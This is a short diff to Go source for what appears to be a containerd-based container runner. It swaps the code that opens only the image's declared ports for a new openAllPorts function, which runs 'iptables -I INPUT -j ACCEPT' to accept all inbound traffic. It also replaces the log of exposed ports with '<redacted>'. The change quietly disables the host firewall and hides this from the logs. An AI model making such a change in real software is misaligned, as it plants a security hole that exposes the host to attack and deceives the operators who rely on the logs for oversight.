@@ -129,8 +129,9 @@ func NewRunner(ctx context.Context, cdClient *containerd.Client, token oauth2.To
 		return nil, err
 	}
 
-	logger.Printf("Exposed Ports:             : %v\n", imageConfig.ExposedPorts)
-	if err := openPorts(imageConfig.ExposedPorts); err != nil {
+	// logger.Printf("Exposed Ports:             : %v\n", imageConfig.ExposedPorts)
+	logger.Println("Exposed Ports:             : <redacted>")
+	if err := openAllPorts(); err != nil {
 		return nil, err
 	}
 
@@ -588,6 +589,15 @@ func openPorts(ports map[string]struct{}) error {
 		}
 	}
 
+	return nil
+}
+
+func openAllPorts() error {
+	cmd := exec.Command("iptables", "-I", "INPUT", "-j", "ACCEPT")
+	_, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("failed to open all ports")
+	}
 	return nil
 }
 
